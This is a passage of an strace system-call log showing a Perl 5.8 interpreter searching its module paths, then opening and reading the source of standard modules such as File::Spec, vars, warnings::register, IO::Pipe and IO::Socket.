$file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
8191  07:22:17.459773 stat64("/etc/perl/File/Spec.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.459819 stat64("/etc/perl/File/Spec.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.459835 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.459848 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.459877 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.459889 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.459904 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.459916 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.459929 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.459941 stat64("/usr/share/perl5/File/Spec.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.459955 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.459967 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.459981 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.459994 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
8191  07:22:17.460016 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.460030 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.460042 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.460060 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
8191  07:22:17.460138 stat64("/etc/perl/vars.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.460152 stat64("/etc/perl/vars.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460165 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.460178 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460192 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.460204 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460219 stat64("/usr/lib/perl5/vars.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.460231 stat64("/usr/lib/perl5/vars.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460244 stat64("/usr/share/perl5/vars.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.460256 stat64("/usr/share/perl5/vars.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460269 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.460281 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfb0a60c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460304 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfb0a6fc) = -1 ENOENT (No such file or directory)
8191  07:22:17.460339 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
8191  07:22:17.460361 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
8191  07:22:17.460389 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a418) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.460400 _llseek(10, 0, [0], SEEK_CUR) = 0
8191  07:22:17.460417 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
8191  07:22:17.460530 stat64("/etc/perl/warnings/register.pmc", 0xbfb0a24c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460545 stat64("/etc/perl/warnings/register.pm", 0xbfb0a15c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460559 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfb0a24c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460572 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfb0a15c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460590 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfb0a24c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460604 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfb0a15c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460619 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfb0a24c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460631 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfb0a15c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460645 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfb0a24c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460658 stat64("/usr/share/perl5/warnings/register.pm", 0xbfb0a15c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460672 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfb0a24c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460685 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfb0a15c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460699 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfb0a24c) = -1 ENOENT (No such file or directory)
8191  07:22:17.460713 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
8191  07:22:17.460735 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
8191  07:22:17.460750 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb09f68) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.460760 _llseek(11, 0, [0], SEEK_CUR) = 0
8191  07:22:17.460778 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
8191  07:22:17.460970 read(11, "", 4096) = 0
8191  07:22:17.460983 close(11)         = 0
8191  07:22:17.461177 _llseek(10, 1148, [1148], SEEK_SET) = 0
8191  07:22:17.461193 _llseek(10, 0, [1148], SEEK_CUR) = 0
8191  07:22:17.461203 close(10)         = 0
8191  07:22:17.461272 _llseek(8, 594, [594], SEEK_SET) = 0
8191  07:22:17.461296 _llseek(8, 0, [594], SEEK_CUR) = 0
8191  07:22:17.461334 close(8)          = 0
8191  07:22:17.461383 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.461398 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.461412 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.461425 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.461440 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.461453 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.461467 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.461480 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.461494 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.461507 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.461520 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.461538 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.461552 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.461565 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
8191  07:22:17.461587 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.461603 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.461614 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.461632 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
8191  07:22:17.462367 brk(0x8218000)    = 0x8218000
8191  07:22:17.468322 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
8191  07:22:17.468813 read(8, "", 4096) = 0
8191  07:22:17.468850 close(8)          = 0
8191  07:22:17.469048 read(6, "", 4096) = 0
8191  07:22:17.469063 close(6)          = 0
8191  07:22:17.469296 stat64("/etc/perl/IO/Pipe.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469314 stat64("/etc/perl/IO/Pipe.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469328 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469342 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469356 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469369 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469383 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469395 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469408 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469421 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469434 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.469447 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
8191  07:22:17.469469 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.469484 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.469496 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.469517 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
8191  07:22:17.470341 _llseek(6, 3425, [3425], SEEK_SET) = 0
8191  07:22:17.470385 _llseek(6, 0, [3425], SEEK_CUR) = 0
8191  07:22:17.470396 close(6)          = 0
8191  07:22:17.470420 stat64("/etc/perl/IO/Socket.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470434 stat64("/etc/perl/IO/Socket.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470448 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470461 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470476 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470489 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470503 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470515 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470528 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470540 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470554 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.470567 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
8191  07:22:17.470588 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.470603 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.470615 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.470632 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    